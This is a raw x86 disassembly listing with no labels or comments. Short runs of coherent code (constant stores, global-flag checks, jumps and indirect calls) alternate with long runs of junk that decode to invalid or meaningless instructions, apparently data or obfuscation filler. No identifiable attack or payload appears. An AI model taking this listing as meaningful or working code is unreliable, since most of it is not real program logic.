  4296ee:	push   ebx
  4296ef:	adc    ebp,DWORD PTR [esi-0x17]
  4296f2:	je     0x429715
  4296f4:	mov    BYTE PTR [esi-0x6f2b62b],cl
  4296fa:	push   eax
  4296fb:	mov    al,ds:0x34b49d8a
  429700:	outs   dx,BYTE PTR ds:[esi]
  429701:	lods   al,BYTE PTR ds:[esi]
  429702:	jmp    DWORD PTR [eax]
  429704:	imul   edi,DWORD PTR [edx],0xfffffff3
  429707:	out    0x5b,al
  429709:	mov    ch,0x41
  42970b:	lahf   
  42970c:	jae    0x42971c
  42970e:	xor    al,0x38
  429710:	sbb    DWORD PTR [esi],0xffffffec
  429713:	mov    DWORD PTR [esp+0x2c],0x65b5
  42971b:	cmp    DWORD PTR ds:0x433674,0x0
  429722:	ja     0x42973c
  429728:	sbb    DWORD PTR ds:0x433600,edi
  42972e:	jmp    0x42973c
  429733:	push   DWORD PTR [ebp-0x1c]
  429736:	call   DWORD PTR ds:0x43c808
  42973c:	mov    DWORD PTR [esp+0x20],0x4f0b
  429744:	mov    DWORD PTR [esp+0x24],0x14c4
  42974c:	jmp    0x42982c
  429751:	inc    edx
  429752:	mov    eax,ds:0xf7f7e496
  429757:	jb     0x429700
  429759:	xchg   edx,eax
  42975a:	repnz leave 
  42975c:	sbb    al,0x29
  42975e:	fdiv   DWORD PTR [edx+ebx*8+0x1f]
  429762:	jmp    0x0:0xc30001
  429769:	sub    DWORD PTR [eax+0x4f],0xffffffb7
  42976d:	mov    dl,0x62
  42976f:	push   0xffffffe2
  429771:	push   0x3cc39c22
  429776:	pop    edi
  429777:	jle    0x42977c
  429779:	or     eax,0x8aa9108c
  42977e:	loope  0x4297af
  429780:	into   
  429781:	loopne 0x4297ad
  429783:	mov    eax,ds:0x9c5a418b
  429788:	mov    ch,0xef
  42978a:	mov    ds:0xc90b1b5a,eax
  42978f:	jmp    0x4b78:0xf15ecbcc
  429796:	sbb    eax,0xe51a492e
  42979b:	loopne 0x429774
  42979d:	mov    eax,0xd9d98671
  4297a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297a3:	out    0xd9,al
  4297a5:	mov    al,ds:0x6e218b11
  4297aa:	xchg   esp,eax
  4297ab:	or     bl,0x8a
  4297ae:	jge    0x4297ff
  4297b0:	and    DWORD PTR [ecx],edx
  4297b2:	or     ecx,DWORD PTR [esi+eax*2]
  4297b5:	mov    dh,0x6d
  4297b7:	jmp    0xb82e:0xe84fb2c
  4297be:	pop    es
  4297bf:	xor    BYTE PTR [esi-0x1d],ch
  4297c2:	cmp    eax,0x5656b3c
  4297c7:	mov    edx,0xd891b521
  4297cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4297cd:	imul   edx,DWORD PTR ds:0x9a829dfb,0xffffff86
  4297d4:	sbb    dh,BYTE PTR ds:0xd9a37a7d
  4297da:	lahf   
  4297db:	pop    edx
  4297dc:	mov    es,WORD PTR [eax+0x6f20e9d5]
  4297e2:	xchg   ecx,eax
  4297e3:	xor    BYTE PTR [ecx-0x2e],dl
  4297e6:	js     0x42979d
  4297e8:	enterw 0x554a,0x5a
  4297ed:	push   ds
  4297ee:	xchg   edx,eax
  4297ef:	imul   ebx,DWORD PTR [eax+0xc],0x7a2220da
  4297f6:	add    BYTE PTR [ebp+0x704dc977],al
  4297fc:	sbb    eax,0x85102e8d
  429801:	add    edx,DWORD PTR [esi+0x36]
  429804:	(bad)  [edx]
  429806:	push   ecx
  429807:	test   DWORD PTR [edx+0xb40bd00],edx
  42980d:	and    al,0x9f
  42980f:	call   0x31041ec6
  429814:	xor    esi,DWORD PTR [ecx-0x7f400dde]
  42981a:	pop    esp
  42981b:	aad    0x15
  42981d:	jle    0x429818
  42981f:	clc    
  429820:	mov    edx,DWORD PTR [ecx-0x21]
  429823:	jbe    0x4297e9
  429825:	leave  
  429826:	sbb    bl,ah
  429828:	clc    
  429829:	push   0x44c79a6c
  42982e:	and    al,0x18
  429830:	mov    ds:0xe9000002,al
  429835:	fild   DWORD PTR [eax]
  429837:	add    BYTE PTR [eax],al
  429839:	aas    
  42983a:	in     eax,dx
  42983b:	sbb    edi,DWORD PTR [ebx-0x12400025]
  429841:	hlt    
  429842:	xor    al,0x20
  429844:	mov    eax,ds:0xe427779b
  429849:	loop   0x429835
  42984b:	add    DWORD PTR [eax],eax
  42984d:	ret    
  42984e:	add    BYTE PTR [eax],al
  429850:	add    BYTE PTR [esi+ebp*8+0x58],cl
  429854:	pop    eax
  429855:	popa   
  429856:	jb     0x4298a2
  429858:	push   eax
  429859:	dec    edx
  42985a:	sbb    eax,0xd977b3df
  42985f:	push   0xffffff83
  429861:	aaa    
  429862:	jl     0x429887
  429864:	sub    BYTE PTR [edx],ch
  429866:	leave  
  429867:	xchg   esp,ecx
  429869:	mov    ds:0xb21e92c8,al
  42986e:	and    DWORD PTR [esi],0xffffffef
  429871:	pusha  
  429872:	inc    esp
  429873:	addr16 xor eax,0x51ecc904
  429879:	in     eax,0x5d
  42987b:	out    0x2b,al
  42987d:	test   ch,cl
  42987f:	sub    ch,BYTE PTR [edx+esi*1]
  429882:	int3   
  429883:	mov    edx,DWORD PTR [ebx+0x51]
  429886:	jnp    0x429872
  429888:	sbb    DWORD PTR [edi],eax
  42988a:	lea    ebp,[edx]
  42988c:	cmp    DWORD PTR [ecx-0x5b7f5211],eax
  429892:	shl    bl,cl
  429894:	call   0x62164d35
  429899:	cmc    
  42989a:	jl     0x42983e
  42989c:	cmp    al,0x80
  42989e:	jmp    0x1fa76c2a
  4298a3:	lods   al,BYTE PTR ds:[esi]
  4298a4:	sti    
  4298a5:	mov    ds:0x3e8289a1,eax
  4298aa:	es arpl di,cx
  4298ad:	mov    DWORD PTR [esi],edi
  4298af:	adc    al,0x5a
  4298b1:	in     al,0xde
  4298b3:	arpl   WORD PTR [eax-0x3727f41a],cx
  4298b9:	xchg   BYTE PTR ds:0x791e9631,dh
  4298bf:	scas   eax,DWORD PTR es:[edi]
  4298c0:	test   eax,0x45f3be95
  4298c5:	in     eax,0x70
  4298c7:	push   ss
  4298c8:	adc    ecx,DWORD PTR [esi]
  4298ca:	xor    esp,ebp
  4298cc:	in     al,0x92
  4298ce:	int3   
  4298cf:	inc    eax
  4298d0:	mov    esp,edi
  4298d2:	cmp    DWORD PTR [edx+0x10],edx
  4298d5:	gs jns 0x4298c7
  4298d8:	pop    ebp
  4298d9:	and    al,0xfc
  4298db:	in     al,0x24
  4298dd:	cmp    DWORD PTR [edx-0x1f],ebx
  4298e0:	push   ss
  4298e1:	xor    al,0x94
  4298e3:	mov    bl,dl
  4298e5:	out    0xd4,al
  4298e7:	enter  0x51b8,0x35
  4298eb:	fsubr  DWORD PTR ds:0x1d220b5d
  4298f1:	jns    0x4298c5
  4298f3:	into   
  4298f4:	pop    eax
  4298f5:	and    ebx,esp
  4298f7:	adc    esp,DWORD PTR ds:0xdbc5e86
  4298fd:	xlat   BYTE PTR ds:[ebx]
  4298fe:	inc    ebx
  4298ff:	neg    DWORD PTR [esi+edi*1+0x7f7a4ae1]
  429906:	mov    eax,ds:0x11df8b3e
  42990b:	cmp    al,0x9e
  42990d:	cld    
  42990e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42990f:	sub    BYTE PTR [edi+eiz*8+0x44c76e3b],bl
  429916:	and    al,0x1c
  429918:	scas   eax,DWORD PTR es:[edi]
  429919:	dec    edi
  42991a:	add    BYTE PTR [eax],al
  42991c:	mov    eax,DWORD PTR [esp+0x18]
  429920:	mov    ecx,DWORD PTR [esp+0x1c]
  429924:	cmp    DWORD PTR ds:0x4335ec,0x0
  42992b:	jg     0x429a1f
  429931:	jmp    0x429a1f
  429936:	push   DWORD PTR [ebp-0x1c]
  429939:	call   DWORD PTR ds:0x43c7cc
  42993f:	jmp    0x429a1f
  429944:	mov    bl,0xec
  429946:	push   eax
  429947:	ins    BYTE PTR es:[edi],dx
  429948:	pop    edi
  429949:	cld    
  42994a:	mov    edi,0xd58fbcff
  42994f:	or     eax,0x9ff89ca9
  429954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429955:	jmp    0x429958
  429957:	add    bl,al
  429959:	add    BYTE PTR [eax],al
  42995b:	add    cl,bh
  42995d:	pushf  
  42995e:	pushfw 
  429960:	aam    0xb1
  429962:	sbb    edx,ebx
  429964:	mov    dl,0xef
  429966:	or     al,0x35
  429968:	push   eax
  429969:	fisttp QWORD PTR [ecx-0x5444b931]
  42996f:	mov    eax,ds:0x899e7dbb
  429974:	arpl   WORD PTR [eax],di
  429976:	repnz mov dl,0x7b
  429979:	xchg   ebp,eax
  42997a:	cdq    
  42997b:	and    BYTE PTR [edi-0x7a8a8436],al
  429981:	pop    esp
  429982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429983:	(bad)  
  429984:	and    eax,0xa88ec43a
  429989:	push   ebp
  42998a:	jae    0x429942
  42998c:	fidivr WORD PTR [edx]
  42998e:	stos   BYTE PTR es:[edi],al
  42998f:	lock adc bh,BYTE PTR [esi+0x7fb6431f]
  429996:	rcr    BYTE PTR [ecx],cl
  429998:	sub    eax,0x48f51842
  42999d:	jle    0x4299b9
  42999f:	adc    al,0x4d
  4299a1:	lods   eax,DWORD PTR ds:[esi]
  4299a2:	cmp    dh,BYTE PTR ss:[edi-0x54d98ce5]
  4299a9:	xchg   ebp,eax
  4299aa:	xor    eax,0x2fe90cd5
  4299af:	rol    BYTE PTR [esi+eax*2-0x20b7c2b8],1
  4299b6:	mov    al,0xee
  4299b8:	repz dec eax
  4299ba:	jmp    0x4bf1:0x6aee2981
  4299c1:	jno    0x429970
  4299c3:	(bad)  
  4299c4:	js     0x4299c1
  4299c6:	fst    DWORD PTR [ebx+0x44]
  4299c9:	dec    edx
  4299ca:	mov    esp,0x2064d70d
  4299cf:	inc    edx
  4299d0:	clc    
  4299d1:	cwde   
  4299d2:	mov    ch,0x2a
  4299d4:	adc    ebp,esp
  4299d6:	ds iret 
  4299d8:	imul   BYTE PTR [eax]
  4299da:	cld    
  4299db:	sbb    al,0xd1
  4299dd:	(bad)  
  4299df:	idiv   edi
  4299e1:	(bad)  
  4299e2:	dec    ebx
  4299e3:	push   ds
  4299e4:	in     al,0x49
  4299e6:	repnz dec ecx
  4299e8:	mov    eax,0xc0f279a0
  4299ed:	jecxz  0x429a5e
  4299ef:	or     ebx,edi
  4299f1:	repz xchg esp,eax
  4299f3:	test   eax,0x3cbbc149
  4299f8:	jge    0x4299ee
  4299fa:	int3   
  4299fb:	dec    edx
  4299fc:	shl    edx,0xef
  4299ff:	popf   
  429a00:	mov    WORD PTR [esi+0x1df6d1a1],es
  429a06:	mov    gs,WORD PTR [ecx+0x4e]
  429a09:	push   eax
  429a0a:	mov    es,WORD PTR [eax-0x1c]
  429a0d:	pop    edi
  429a0e:	mov    bh,0xdb
  429a10:	cli    
  429a11:	sbb    DWORD PTR [ecx+0x44],ebx
  429a14:	xor    al,0x45
  429a16:	(bad)  
  429a17:	arpl   WORD PTR [eax+0x21],bx
  429a1a:	sbb    ecx,DWORD PTR [eax-0x7451cdbb]
  429a20:	push   esp
  429a21:	and    al,0x20
  429a23:	mov    ebx,DWORD PTR [esp+0x24]
  429a27:	xor    ecx,0x35b0
  429a2d:	xor    eax,0x14c5
  429a32:	sub    eax,edx
  429a34:	mov    edx,DWORD PTR [esp+0x28]
  429a38:	sbb    ecx,ebx
  429a3a:	cmp    DWORD PTR ds:0x433654,0x0
  429a41:	jge    0x429b37
  429a47:	jmp    0x429b37
  429a4c:	push   0x578b
  429a51:	call   DWORD PTR ds:0x43c7d0
  429a57:	jmp    0x429b37
  429a5c:	sub    eax,0x2f212f20
  429a61:	das    
  429a62:	das    
  429a63:	sub    al,0x91
  429a65:	or     esp,ebx
  429a67:	lahf   
  429a68:	xlat   BYTE PTR ds:[ebx]
  429a69:	mov    dl,0x28
  429a6b:	lahf   
  429a6c:	push   0xc30001ec
  429a71:	add    BYTE PTR [eax],al
  429a73:	add    BYTE PTR [esi-0x6d],ch
  429a76:	mov    ecx,0x592d18b7
  429a7b:	jmp    0x302ee091
  429a80:	(bad)  
  429a81:	pop    ebx
  429a82:	fstp   DWORD PTR [esi]
  429a84:	xlat   BYTE PTR ds:[ebx]
  429a85:	(bad)  
  429a86:	sbb    DWORD PTR [ebx],esp
  429a88:	cmc    
  429a89:	jns    0x65d5c801
  429a8f:	jmp    0x7bb9:0xe592b239
  429a96:	and    ah,BYTE PTR [ebx]
  429a98:	and    al,0x94
  429a9a:	jl     0x429a5d
  429a9c:	stos   BYTE PTR es:[edi],al
  429a9d:	xor    DWORD PTR [ebp+0x5a],0x5412c097
  429aa4:	and    al,0x57
  429aa6:	ins    BYTE PTR es:[edi],dx
  429aa7:	lods   al,BYTE PTR ds:[esi]
  429aa8:	pop    edx
  429aa9:	int3   
  429aaa:	push   0xffffffb0
  429aac:	dec    edi
  429aad:	(bad)  
  429aae:	push   ecx
  429aaf:	pop    ecx
  429ab0:	out    0xb5,al
  429ab2:	mov    bl,0x3
  429ab4:	imul   ebx,DWORD PTR [ebx],0x3f1ddc75
  429aba:	add    esi,DWORD PTR [edx-0x38052e03]
  429ac0:	adc    al,0x85
  429ac2:	jmp    DWORD PTR [edx-0x39]
  429ac5:	xor    esi,DWORD PTR gs:0x88b434c2
  429acc:	pop    es
  429acd:	jg     0x429b46
  429acf:	ins    DWORD PTR es:[edi],dx
  429ad0:	xchg   BYTE PTR ds:0x7a3c,bl
  429ad5:	and    edi,DWORD PTR [eax+eax*1+0x18]
  429ad9:	fwait
  429ada:	into   
  429adb:	cmp    al,BYTE PTR [ebx+esi*8+0x55]
  429adf:	sub    ebx,DWORD PTR ds:0x74bddb68
  429ae5:	pop    es
  429ae6:	sbb    al,0xbc
  429ae8:	in     eax,0x33
  429aea:	inc    esp
  429aeb:	xchg   edi,eax
  429aec:	sbb    esi,DWORD PTR [ecx]
  429aee:	inc    DWORD PTR ds:0xcf854cb9
  429af4:	dec    eax
  429af5:	or     DWORD PTR [ecx],ebx
  429af7:	mov    ch,0x71
  429af9:	(bad)  
  429afa:	(bad)  
  429afb:	and    edi,DWORD PTR [esi-0x71]
  429afe:	push   esi
  429aff:	inc    ebp
  429b00:	fadd   DWORD PTR [ebp-0x10]
  429b03:	cmc    
  429b04:	xchg   ebx,eax
  429b05:	jnp    0x429b75
  429b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b08:	adc    al,0x42
  429b0a:	aam    0x69
  429b0c:	add    eax,edi
  429b0e:	mov    al,ds:0xd2e66ead
  429b13:	jg     0x429aa0
  429b15:	fild   DWORD PTR [edx]
  429b17:	loope  0x429b8b
  429b19:	adc    DWORD PTR [ebp+0x1778c2ff],eax
  429b1f:	lea    ebx,[esi-0x4c7655a7]
  429b25:	mov    al,0xe9
  429b27:	inc    ebx
  429b28:	es dec ebx
  429b2a:	sbb    DWORD PTR [edi-0x25993888],ecx
  429b30:	jmp    0x99cd:0xb7b9e46c
  429b37:	mov    ebx,DWORD PTR [esp+0x2c]
  429b3b:	jmp    0x429c1b
  429b40:	push   ebp
  429b41:	into   
  429b42:	or     al,0x7f
  429b44:	lahf   
  429b45:	push   DWORD PTR [edi-0x12]
  429b48:	addr16 iretw 
  429b4b:	mov    eax,ds:0xd095bf0
  429b50:	sub    ebp,ebp
  429b52:	add    DWORD PTR [eax],eax
  429b54:	ret    
  429b55:	add    BYTE PTR [eax],al
  429b57:	add    BYTE PTR [edi-0x34ae8475],ah
  429b5d:	stc    
  429b5e:	aad    0x4c
  429b60:	std    
  429b61:	out    0x3d,eax
  429b63:	jns    0x429b3b
  429b65:	in     al,dx
  429b66:	push   ss
  429b67:	sahf   
  429b68:	pop    edi
  429b69:	jl     0x429ba8
  429b6b:	leave  
  429b6c:	adc    eax,0xef01360
  429b71:	cmp    al,BYTE PTR [bx+si-0x3d16]
  429b76:	mov    ch,0x54
  429b78:	(bad)  
  429b79:	call   0x185ead42
  429b7e:	scas   al,BYTE PTR es:[edi]
  429b7f:	mov    WORD PTR [esi+0x36d24753],?
  429b85:	test   eax,ebx
  429b87:	mov    eax,ds:0xfcc4c1a3
  429b8c:	dec    ebp
  429b8d:	inc    eax
  429b8e:	icebp  
  429b8f:	mov    BYTE PTR [esi+0x474382aa],bh
  429b95:	lds    ecx,FWORD PTR [ebx+ebp*4-0x26]
  429b99:	add    eax,0xc79e5662
  429b9e:	cdq    
  429b9f:	mov    DWORD PTR [ecx],ecx
  429ba1:	xchg   ecx,eax
  429ba2:	dec    ecx
  429ba3:	xchg   ebx,eax
  429ba4:	push   edi
  429ba5:	ss xchg BYTE PTR ds:[eax+0x4c6d847],bh
  429bad:	mov    dl,0x15
  429baf:	ror    DWORD PTR [edi],cl
  429bb1:	lea    ecx,[esi-0x39e75d55]
  429bb7:	sub    BYTE PTR [edx+0x7f],cl
  429bba:	inc    esp
  429bbb:	push   edi
  429bbc:	jg     0x429c17
  429bbe:	rcr    DWORD PTR [ecx+0x2e82264a],cl
  429bc4:	hlt    
  429bc5:	je     0x429c16
  429bc7:	arpl   di,ax
  429bc9:	fwait
  429bca:	mov    ebx,0x99673ed
  429bcf:	xchg   edx,eax
  429bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bd1:	add    DWORD PTR [ebx-0x57],0xfffffff7
  429bd5:	mov    ah,0xdc
  429bd7:	outs   dx,BYTE PTR ds:[esi]
  429bd8:	sbb    ah,BYTE PTR [esi-0x22b3aeb8]
  429bde:	sti    
  429bdf:	pop    eax
  429be0:	cmp    BYTE PTR [edx+0x73],bl
  429be3:	inc    esp
  429be4:	dec    edi
  429be5:	int3   
  429be6:	loope  0x429c06
  429be8:	lods   eax,DWORD PTR ds:[esi]
  429be9:	jae    0x429bdc
  429beb:	or     eax,0x6ef46bd3
  429bf0:	loopne 0x429c2a
  429bf2:	jo     0x429bfa
  429bf4:	ret    
  429bf5:	or     dh,BYTE PTR ds:0x92b91c35
  429bfb:	push   0x6dd0e7e4
  429c00:	cmp    eax,0xc05d72bb
  429c05:	ja     0x429b9d
  429c07:	test   eax,0x8c2e3516
  429c0c:	dec    esp
  429c0d:	shl    DWORD PTR [ebx],cl
  429c0f:	(bad)  [esi+0x273740c2]
  429c15:	clc    
  429c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c17:	stos   BYTE PTR es:[edi],al
  429c18:	pop    eax
  429c19:	push   eax
  429c1a:	je     0x429c47
  429c1c:	ret    0x548b
  429c1f:	and    al,0x30
  429c21:	sbb    ecx,ebx
  429c23:	mov    ebx,DWORD PTR [esp+0x34]
  429c27:	jmp    0x429d07
  429c2c:	inc    ecx
  429c2d:	leave  
  429c2e:	push   eax
  429c2f:	rcr    al,0xd9
  429c32:	ror    ecx,1
  429c34:	sbb    dl,BYTE PTR [esi-0x65]
  429c37:	jo     0x429bf9
  429c39:	neg    edi
  429c3b:	dec    esi
  429c3c:	out    dx,al
  429c3d:	in     eax,dx
  429c3e:	add    DWORD PTR [eax],eax
  429c40:	ret    
  429c41:	add    BYTE PTR [eax],al
  429c43:	add    BYTE PTR [edi+ebp*4],ch
  429c46:	addr16 sub eax,0x34d16d44
  429c4c:	les    esi,FWORD PTR [esi+ecx*8]
  429c4f:	cmp    eax,0x8e587d51
  429c54:	mov    DWORD PTR [edi+0x8f5dc38],ebp
  429c5a:	jns    0x429c4d
  429c5c:	and    DWORD PTR [edx-0xe],ebx
  429c5f:	xchg   ebp,eax
  429c60:	and    al,0x68
  429c62:	hlt    
  429c63:	scas   eax,DWORD PTR es:[edi]
  429c64:	inc    ebp
  429c65:	dec    ebp
  429c66:	xchg   esi,eax
  429c67:	cmc    
  429c68:	jo     0x429c67
  429c6a:	bound  edi,QWORD PTR [ecx+0x32ea5888]
  429c70:	xchg   ebx,eax
  429c71:	cmp    DWORD PTR [edx+eiz*1+0x3ace8474],esp
  429c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c79:	sub    cl,BYTE PTR [edx]
  429c7b:	ins    BYTE PTR es:[edi],dx
  429c7c:	es jp  0x429bff
  429c7f:	pop    edx
  429c80:	pushf  
  429c81:	ja     0x429c47
  429c83:	ror    BYTE PTR [edi+0x3ab8b797],cl
  429c89:	aad    0x46
  429c8b:	enter  0x38c2,0x89
  429c8f:	imul   eax,DWORD PTR [edx],0x1eecf9d3
  429c95:	hlt    
  429c96:	cmp    dl,BYTE PTR [ebp+eax*2-0x31351536]
  429c9d:	mov    cs,WORD PTR [edi+eiz*8+0x19cd1f4d]
  429ca4:	sbb    esp,esp
  429ca6:	enter  0xe7d7,0xd1
  429caa:	stc    
  429cab:	cli    
  429cac:	jne    0x429cd4
  429cae:	pop    eax
  429caf:	retf   0xed25
  429cb2:	and    ebx,ebx
  429cb4:	pop    es
  429cb5:	fldcw  WORD PTR [ebx+0x30fa7579]
  429cbb:	xchg   esp,eax
  429cbc:	clc    
  429cbd:	mov    eax,ds:0x8cf89346
  429cc2:	es push esi
  429cc4:	(bad)  
  429cc5:	ds xor al,0xaf
  429cc8:	add    eax,0x59d7782f
  429ccd:	pusha  
  429cce:	pop    edi
  429ccf:	outs   dx,BYTE PTR ds:[esi]
  429cd0:	lds    ecx,FWORD PTR [ebp+0x2d]
  429cd3:	pop    esp
  429cd4:	scas   eax,DWORD PTR es:[edi]
  429cd5:	clc    
  429cd6:	daa    
  429cd7:	je     0x429ccb
  429cd9:	push   eax
  429cda:	out    0xe0,al
  429cdc:	jb     0x429d22
  429cde:	jae    0x429d47
  429ce0:	or     eax,0xa93abde5
  429ce5:	(bad)  
  429ce6:	sub    BYTE PTR [esi-0x7e25979d],ah
  429cec:	mov    WORD PTR ds:0x735d0213,es
  429cf2:	add    eax,0xb653d831
  429cf7:	jp     0x429c8f
  429cf9:	sub    DWORD PTR [edx],edi
  429cfb:	pusha  
  429cfc:	iret   
  429cfd:	aad    0x85
  429cff:	push   esp
  429d00:	data16 cmp BYTE PTR [edx+0xdad8c10],dl
  429d07:	add    eax,0xffffff83
  429d0a:	adc    ecx,0xfffff0d6
  429d10:	mov    DWORD PTR ds:0x433620,0x486
  429d1a:	jmp    0x429dfa
  429d1f:	xchg   esp,eax
  429d20:	jp     0x429d92
  429d22:	inc    esi
  429d23:	dec    BYTE PTR [esi-0x4a]
  429d26:	cli    
  429d27:	ss push ecx
  429d29:	mov    dh,0x1c
  429d2b:	mov    cl,0x4c
  429d2d:	add    cl,BYTE PTR ds:0x1eeb1
  429d33:	ret    
  429d34:	add    BYTE PTR [eax],al
  429d36:	add    BYTE PTR [ebp-0x4c],cl
  429d39:	push   es
  429d3a:	mov    ecx,0x28d0586f
  429d3f:	mov    al,ds:0x37316c6b
  429d44:	pop    esi
  429d45:	xchg   edx,eax
  429d46:	std    
  429d47:	repnz mov ch,0x4c
  429d4a:	jmp    0x429d50
  429d4c:	aad    0xae
  429d4e:	(bad)  
  429d4f:	enter  0xa47e,0x4a
  429d53:	and    eax,0xc13b07ce
  429d58:	ds ins BYTE PTR es:[edi],dx
  429d5a:	push   edi
  429d5b:	es inc esp
  429d5d:	icebp  
  429d5e:	shl    BYTE PTR [esi+0x1a2409c2],1
  429d64:	scas   eax,DWORD PTR es:[edi]
  429d65:	pop    esp
  429d66:	dec    ecx
  429d67:	cdq    
  429d68:	cdq    
  429d69:	add    eax,ebp
  429d6b:	sub    BYTE PTR ds:0xd41f5ad5,bh
  429d71:	or     DWORD PTR [ecx],0xd02017cf
  429d77:	or     eax,DWORD PTR [ebp-0x589e295e]
  429d7d:	cld    
  429d7e:	fisttp WORD PTR [edx]
  429d80:	add    cl,bl
  429d82:	(bad)
  429d86:	sub    al,0x13
  429d88:	popf   
  429d89:	les    edx,FWORD PTR [eax]
  429d8b:	mov    edi,DWORD PTR [eax+0x40192122]
  429d91:	cwde   
  429d92:	call   0xcee0:0xf72e392c
  429d99:	fst    QWORD PTR ds:0xce25bcb3
  429d9f:	push   cs
  429da0:	mov    cl,0x95
  429da2:	dec    ebp
  429da3:	in     al,dx
  429da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429da5:	popa   
  429da6:	sub    eax,0x7a4f00aa
  429dab:	test   BYTE PTR [ebp+0x21],dl
  429dae:	mov    ?,WORD PTR [ebx]
  429db0:	lahf   
  429db1:	test   BYTE PTR [edi],cl
  429db3:	clc    
  429db4:	or     al,0x1d
  429db6:	stc    
  429db7:	mov    ds:0x60ecfa7e,eax
  429dbc:	je     0x429d4c
  429dbe:	clc    
  429dbf:	jo     0x429d6a
  429dc1:	pop    ds
  429dc2:	and    BYTE PTR [edx],bl
  429dc4:	xchg   edx,eax
  429dc5:	or     al,0xf1
  429dc7:	out    dx,eax
  429dc8:	out    0xce,eax
  429dca:	adc    ebp,DWORD PTR [edx]
  429dcc:	push   edi
  429dcd:	mov    bl,dh
  429dcf:	xor    ecx,esp
  429dd1:	das    
  429dd2:	or     al,ah
  429dd4:	(bad)  
  429dd5:	in     eax,0xb9
  429dd7:	dec    edx
  429dd8:	out    0x64,eax
  429dda:	fld    DWORD PTR [ebx+0x3a28f31e]
  429de0:	push   ebp
  429de1:	lock icebp 
  429de3:	xor    BYTE PTR cs:[ebp+ebp*4-0x1fb159a0],bl
  429deb:	add    BYTE PTR [edi-0x3e],bl
  429dee:	std    
  429def:	fs push ebp
  429df1:	or     al,0x63
  429df3:	adc    eax,DWORD PTR [esi-0x20]
  429df6:	mov    eax,0x3b76829b
  429dfb:	ret    0x5c7
  429dfe:	or     al,0x36
  429e00:	inc    ebx
  429e01:	add    BYTE PTR [esi],dl
  429e03:	sub    eax,DWORD PTR [eax]
  429e05:	add    BYTE PTR [edi],cl
  429e07:	test   DWORD PTR [eax],ecx
  429e09:	add    BYTE PTR [eax],al
  429e0b:	add    BYTE PTR [ebx],bh
  429e0d:	retf   
  429e0e:	je     0x42d682
  429e14:	mov    eax,DWORD PTR [esp+0x44]
  429e18:	jmp    0x429ef8
  429e1d:	jns    0x429e1d
  429e1f:	retf   0xcfb4
  429e22:	mov    ah,0x7f
  429e24:	push   DWORD PTR [ebx-0x2d]
  429e27:	mov    WORD PTR [edi+0x70],ds
  429e2a:	inc    edx
  429e2b:	cmc    
  429e2c:	sbb    al,0x74
  429e2e:	out    dx,eax
  429e2f:	add    DWORD PTR [eax],eax
  429e31:	ret    
  429e32:	add    BYTE PTR [eax],al
  429e34:	add    BYTE PTR [ebp-0x45a9c4e5],dh
  429e3a:	sbb    BYTE PTR [ebp+0x1fa3a194],bl
  429e40:	xchg   ebp,eax
  429e41:	xchg   edx,eax
  429e42:	push   es
  429e43:	jno    0x429e6f
  429e45:	dec    eax
  429e46:	sti    
  429e47:	mov    dh,0xf6
  429e49:	adc    BYTE PTR [esi+0x7d14fa83],ah
  429e4f:	mov    ds,WORD PTR [edx-0x32]
  429e52:	stos   BYTE PTR es:[edi],al
  429e53:	je     0x429e3a
  429e55:	daa    
  429e56:	sub    eax,DWORD PTR [edi+ecx*2-0x33107c79]
  429e5d:	daa    
  429e5e:	xchg   edx,eax
  429e5f:	fs inc esp
  429e61:	pop    ss
  429e62:	push   ebx
  429e63:	js     0x429e5c
  429e65:	adc    al,al
  429e67:	aas    
  429e68:	shr    BYTE PTR [ebp+0x4b19f1e6],cl
  429e6e:	sbb    DWORD PTR [esi+0x27],edi
  429e71:	out    dx,al
  429e72:	mov    ds:0x2beda0bc,al
  429e77:	push   eax
  429e78:	sub    DWORD PTR [ecx+0x21],ecx
  429e7b:	cli    
  429e7c:	call   0xab793873
  429e81:	cmp    DWORD PTR [ebp+0x7be8077d],0x15fade9e
  429e8b:	cwde   
  429e8c:	sub    bh,BYTE PTR [esi-0x35197ddd]
  429e92:	pop    eax
  429e93:	cmp    al,0x32
  429e95:	xchg   ebp,eax
  429e96:	inc    edx
  429e97:	(bad)
  429e9a:	sub    eax,0x59089cad
  429e9f:	pop    ebp
  429ea0:	push   ebp
  429ea1:	adc    eax,0x8020d8de
  429ea6:	in     al,dx
  429ea7:	pusha  
  429ea8:	stc    
  429ea9:	inc    ebx
  429eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429eab:	enter  0x22fe,0xb9
  429eaf:	mov    cl,0xa7
  429eb1:	sub    ebp,DWORD PTR [ecx+ecx*4-0x3]
  429eb5:	out    dx,al
  429eb6:	xor    BYTE PTR [eax-0x66],ch
  429eb9:	mov    ds:0xf6c76382,eax
  429ebe:	out    dx,eax
  429ebf:	add    esi,DWORD PTR [eax]
  429ec1:	js     0x429ee3
  429ec3:	pop    edx
  429ec4:	jg     0x429efa
  429ec6:	and    dl,dl
  429ec8:	ret    
  429ec9:	mov    ah,0xcd
  429ecb:	push   0xffffffa1
  429ecd:	repz mov esi,0xcb1d4f63
  429ed3:	xchg   ebp,eax
  429ed4:	in     eax,0xe5
  429ed6:	(bad)  
  429ed7:	imul   ecx,DWORD PTR [eax+ebx*1],0xffffffc1
  429edb:	mov    bl,0x42
  429edd:	lods   eax,DWORD PTR ds:[esi]
  429ede:	mov    ecx,0xde5a6a70
  429ee3:	(bad)  
  429ee4:	(bad)  
  429ee5:	push   ebx
  429ee6:	loope  0x429f61
  429ee8:	xchg   esi,eax
  429ee9:	cmp    eax,0x81b2ab4d
  429eee:	retf   0x4193
  429ef1:	mov    BYTE PTR [eax],cl
  429ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ef4:	aas    
  429ef5:	mov    edx,0xd233eb71
  429efa:	add    eax,edi
  429efc:	jmp    0x429fdc
  429f01:	ins    DWORD PTR es:[edi],dx
  429f02:	shr    BYTE PTR [edi+ebp*2-0x1],cl
  429f06:	jmp    FWORD PTR [edi-0x2e]
